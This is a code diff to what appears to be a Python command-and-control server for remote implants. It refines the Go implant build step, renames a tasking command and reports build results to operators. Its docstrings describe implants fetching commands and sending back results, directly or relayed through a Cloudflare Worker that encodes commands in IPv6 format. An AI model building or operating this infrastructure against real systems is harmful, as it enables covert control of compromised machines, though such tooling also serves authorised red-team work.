@@ -5,6 +5,7 @@ import logging
 import os
 import socket
 import ssl
+import subprocess
 import threading
 import time
 from queue import Queue, Empty
@@ -83,8 +84,16 @@ def build_implant(protocol):
     """
     match protocol:
         case "http":
-            os.chdir("./implant")
-            os.system("go build -tags http ./http")
+            try:
+                os.chdir("./implant")
+                subprocess.run(["go", "build", "-tags", "http", "./http"],check=True, capture_output=True, text=True)
+                return True
+            except subprocess.CalledProcessError as e:
+                logger.error(f"error building: {e}")
+                return False
+            except Exception as e:
+                logger.error(f"general exception occurred: {e}")
+                return False
 
 
 def add_user(new_user_id):
@@ -219,7 +228,7 @@ def handle_client(client_socket):
                     logger.error("bad token")
                     client_socket.send("Bad token\n".encode())
 
-            case "SUB":
+            case "RTR":
                 logger.info("controller requesting implant last messages")
                 request_type, uname, token, *message = client_request.split(" ", 3)
                 logger.info(f"checking session token")
@@ -237,6 +246,10 @@ def handle_client(client_socket):
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
                     bld_status = build_implant(message)
+                    if bld_status is True:
+                        client_socket.send("Building implant succeeded!")
+                    else:
+                        client_socket.send("Building implant failed...")
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token")
@@ -288,7 +301,7 @@ def authenticated_get(path):
 @app.route('/direct/<path:path>', methods=['GET'])
 def http_get(path):
     """
-    Handles implants using basic HTTP for check-in
+    Handles implants skipping the CF Worker and using basic HTTP for check-in
     :param path: This represents the implant ID
     :return: Either the waiting command or error
     """
@@ -316,7 +329,7 @@ def http_get(path):
 @app.route('/<path:path>', methods=['GET'])
 def catch_all_get(path):
     """
-    Handles how implants query for waiting commands
+    Handles the CF JS worker script getting waiting commands in IPv6 format
     :param path: This represents the implant ID
     :return: Either the waiting command or error
     """
@@ -338,7 +351,9 @@ def catch_all_get(path):
 @app.route('/<path:path>', methods=['POST'])
 def catch_all_post(path):
     """
-    Handles the incoming data streams from an implant proxied through Cloudflare
+    Implants either directly or through the CF worker send results here
+    POSTS come in as JSON, need a msg field
+    Will eventually probably also use the HMAC to verify authenticity
     :param path: This represents the implant ID
     :return: Either 200 or error
     """
@@ -385,7 +400,7 @@ def start_server():
         server,
         server_side=True,
     )
-    logger.info("TLS socket started on port 9999\n")
+    logger.info("TLS socket wrapped and starting on port 9999\n")
 
     while True:
         client_socket, addr = secure_socket.accept()
